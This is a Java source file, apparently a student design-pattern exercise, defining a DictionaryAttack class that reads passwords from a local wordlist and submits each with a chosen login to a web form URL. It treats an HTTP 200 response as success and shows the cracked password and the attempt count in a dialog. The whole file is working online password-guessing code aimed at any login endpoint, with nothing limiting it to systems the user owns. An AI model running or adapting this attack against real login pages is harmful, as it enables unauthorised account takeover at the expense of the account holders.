package FactoryMethod.PasswordCracker;

import javax.swing.*;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.Scanner;

public class DictionaryAttack implements Cracker  {
    HttpClientPostForm http = new HttpClientPostForm();
    Boolean foundpwd = false;
    int count = 0;
    @Override
    public void hack(String login, String url) {
        try {
            FileInputStream file = new FileInputStream("C:/Users/Fallou/Documents/DIC1/java/FactoryMethod/PasswordCracker/file.txt"   );
            Scanner myReader = new Scanner(file);

            while (myReader.hasNextLine()) {
                String password = myReader.nextLine();
                count++;
                if((http.getPassword(url, login, password)==200)) {

                    System.out.println();
                    JOptionPane.showMessageDialog(null, "mot de passe trouve : " + password + "\nnombre de tentative " + count  );
                    foundpwd = true;
                }
            }
            if(!foundpwd) {
                JOptionPane.showMessageDialog(null, "Password not found" );
            }
            myReader.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    }

